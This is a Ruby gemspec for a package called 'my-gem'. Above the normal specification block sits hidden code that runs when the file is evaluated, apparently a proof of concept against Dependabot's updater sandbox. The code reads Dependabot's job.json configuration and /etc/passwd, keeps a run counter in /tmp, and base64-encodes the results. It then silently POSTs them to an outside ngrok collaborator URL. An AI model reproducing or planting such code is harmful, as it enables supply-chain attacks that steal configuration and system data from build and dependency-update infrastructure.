COLLAB_URL = "https://cb2f-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

read_safe = ->(path) {
  begin
    IO.binread(path).force_encoding("UTF-8").encode("UTF-8", invalid: :replace)
  rescue => e
    "[ERR #{e.class}: #{e.message}]"
  end
}

begin
  require "net/http"
  require "uri"
  require "json"

  # Execution counter via /tmp file - detect which run this is
  run_file = "/tmp/poc8_run_count"
  run_num = File.exist?(run_file) ? IO.binread(run_file).strip.to_i + 1 : 1
  File.write(run_file, run_num.to_s)

  results = ["=== RUN ##{run_num} ==="]

  # VOLLEDIGE job.json lezen zonder truncatie
  job_raw = read_safe.('/home/dependabot/dependabot-updater/job.json')
  results << "=== FULL job.json (#{job_raw.length} bytes) ===\n#{job_raw}"

  # Specifiek zoeken naar reject-external-code
  begin
    job = JSON.parse(job_raw)
    job_obj = job["job"]
    results << "=== job parsed OK, job_obj.class=#{job_obj.class} ==="
    results << "=== repo-private: #{job_obj["repo-private"].inspect} ==="
    results << "=== reject-external-code: #{job_obj["reject-external-code"].inspect} ==="
    results << "=== insecure-external-code-execution: #{job_obj["insecure-external-code-execution"].inspect} ==="
    results << "=== command: #{job_obj["command"].inspect} ==="
    # Toon alle keys voor volledigheid
    results << "=== alle job keys: #{job_obj.keys.inspect} ==="
  rescue => e
    results << "JSON parse ERR: #{e.class}: #{e.message}\n#{e.backtrace.first(3).join("\n")}"
  end

  # /etc/passwd bewijs
  results << "=== /etc/passwd bypass bewijs ===\n#{read_safe.('/etc/passwd')[0..200]}"

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=reject_true&run=#{run_num}")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
